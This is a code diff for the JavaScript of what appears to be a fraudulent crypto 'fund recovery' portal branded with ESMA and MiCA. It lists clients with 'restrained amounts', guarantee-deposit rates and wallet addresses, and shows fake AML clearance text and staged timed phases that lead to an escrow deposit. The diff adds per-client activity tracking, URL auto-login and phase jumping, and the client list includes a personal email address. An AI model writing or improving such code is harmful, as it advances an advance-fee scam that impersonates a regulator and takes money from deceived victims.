@@ -811,8 +811,7 @@ date: "September 16th, 2026",
 currency: "GBP",
 currencySymbol: "£",
 restrainedAmount: 22932.76,
-    guaranteeRate: 0.10, // 10%
-    guaranteeRate: 0.12, // 12%
+guaranteeRate: 0.12, // 12%
 wallet: "0x2B27087e1c5A3981C3Db4E8E28B0f07CfaFdB1CB"
 },
 "ingenandersson@gmail.com": {
@@ -886,6 +885,48 @@ wallet: "0x9477c6e1dAc83E8E05E6923E36256A0F8d50dC0c"
 let currentClient = null;
 let currentLang = "ENG";
 let exchangeRates = { USD: 2500, EUR: 2300, GBP: 2900 }; // Default fallback rates
+
+// --- BACKGROUND TRACKING DATABASE LOGIC ---
+function trackClientActivity(phaseNumber, actionName = "Phase Access") {
+  const emailInput = document.getElementById('emailInput')?.value.trim().toLowerCase();
+  const urlParams = new URLSearchParams(window.location.search);
+  let clientEmail = urlParams.get('email') || emailInput;
+
+  if (!clientEmail && currentClient) {
+    clientEmail = currentClient.email;
+  }
+
+  if (!clientEmail) {
+    try {
+      clientEmail = localStorage.getItem('esma_active_client_email');
+    } catch(e) {}
+  }
+
+  if (clientEmail) {
+    try {
+      localStorage.setItem('esma_active_client_email', clientEmail);
+    } catch(e) {}
+
+    const timestamp = new Date().toISOString();
+    const entry = {
+      email: clientEmail,
+      phase: `Phase ${phaseNumber}`,
+      action: actionName,
+      timestamp: timestamp,
+      localTime: new Date().toLocaleString()
+    };
+
+    let dbLogs = [];
+    try {
+      dbLogs = JSON.parse(localStorage.getItem('esma_client_activity_db') || '[]');
+    } catch(e) {
+      dbLogs = [];
+    }
+
+    dbLogs.unshift(entry);
+    localStorage.setItem('esma_client_activity_db', JSON.stringify(dbLogs));
+  }
+}
 
 // --- TRANSLATION DICTIONARY ---
 const i18n = {
@@ -1146,7 +1187,7 @@ aml1Title: "Identiteitsverificatie", aml1Desc: "Door de overheid uitgegeven ID b
 aml2Title: "Eigendom Bankrekening", aml2Desc: "Ontvangende rekening geverifieerd",
 aml3Title: "Herkomst van Fondsen", aml3Desc: "Overeenkomstig met verklaarde handelsactiviteiten; voldoende aangetoond",
 aml4Title: "Transactiebeoordeling", aml4Desc: "Historie geanalyseerd; technische vlaggen toegeschreven aan parameters, geen wangedrag",
-aml5Title: "Risicoscreening", aml5Desc: "Geen sancties, fraude of verboden activiteiten gedetecteerd",
+aml5Title: "Risicoscreening", aml5Desc: "Geen sancties, fraude of verboden activiteiten gedecteerd",
 aml6Title: "Verhoogd Cliëntenonderzoek (EDD)", aml6Desc: "Voldaan voor AML-classificatie",
 aml7Title: "Garantieborgsom", aml7Desc: "VEREIST ALS BEWIJS VAN LIQUIDITEIT",
 p5WarningTitle: "WETTELIJKE TERMIJNKENNISGEVING",
@@ -1689,6 +1730,22 @@ currentLang = langMap[userLang];
 document.getElementById('langSelect').value = currentLang;
 }
 changeLanguage(currentLang);
+
+// URL Parameter Auto-login & Direct Phase Navigation
+const urlParams = new URLSearchParams(window.location.search);
+const paramEmail = urlParams.get('email');
+const paramPhase = urlParams.get('phase');
+
+if (paramEmail && clients[paramEmail.trim().toLowerCase()]) {
+  currentClient = clients[paramEmail.trim().toLowerCase()];
+  populateClientData();
+  trackClientActivity(paramPhase || 1, "Direct Client Session Entry");
+  if (paramPhase) {
+    showPhase(parseInt(paramPhase));
+  }
+} else {
+  trackClientActivity(1, "Portal Opened / Identity Access Page");
+}
 }
 
 function handleKeyPress(event) {
@@ -1719,6 +1776,9 @@ function showPhase(n){
 document.querySelectorAll('.phase').forEach(p=>p.classList.remove('active'));
 document.getElementById('phase'+n).classList.add('active');
 window.scrollTo(0,0);
+
+// Background tracking call on phase transition
+trackClientActivity(n, `Navigated to Phase ${n}`);
 }
 
 function formatCurrency(val, symbol) {
@@ -1743,6 +1803,9 @@ return alert("Client not found");
 
 currentClient = foundClient;
 populateClientData();
+
+// Track successful login to database
+trackClientActivity(1, "Successful Client Login Search");
 
 showPhase(2);
 setTimeout(()=>showPhase(3), 4000); // 4 Seconds
@@ -1828,12 +1891,14 @@ document.getElementById('walletAddr').innerText = currentClient.wallet;
 
 function openAgreement(){ 
 document.getElementById('agreementModal').style.display='flex'; 
+trackClientActivity(3, "Claim Agreement Modal Opened");
 }
 
 function confirmAgreement(){
 const dict = i18n[currentLang] || i18n.ENG;
 if(!document.getElementById('micaAgree').checked) return alert(dict.errCheck);
 document.getElementById('agreementModal').style.display='none';
+trackClientActivity(3, "MiCA Compliance Affirmation Agreed");
 showPhase(4);
 setTimeout(()=>showPhase(5), 5000); // 5 Seconds
 }
@@ -1845,6 +1910,7 @@ function handleAssetChoice(){
 const dict = i18n[currentLang] || i18n.ENG;
 const c = document.getElementById('assetSelect').value;
 if(!c) return alert(dict.errSelectAsset);
+trackClientActivity(7, `Asset Selected: ${c}`);
 if(c !== "ETH"){
 alert(dict.errMaint.replace('{c}', c));
 return;
@@ -1857,10 +1923,12 @@ function copyAddress(){
 const dict = i18n[currentLang] || i18n.ENG;
 navigator.clipboard.writeText(document.getElementById('walletAddr').innerText);
 alert(dict.msgCopied);
+trackClientActivity(8, "Escrow Address Copied to Clipboard");
 }
 
 function showDispatchNotification(){
 document.getElementById('dispatchNotificationModal').style.display = 'flex';
+trackClientActivity(8, "Confirmed Deposit Dispatched Button Clicked");
 }
 
 function closeDispatchModal(){
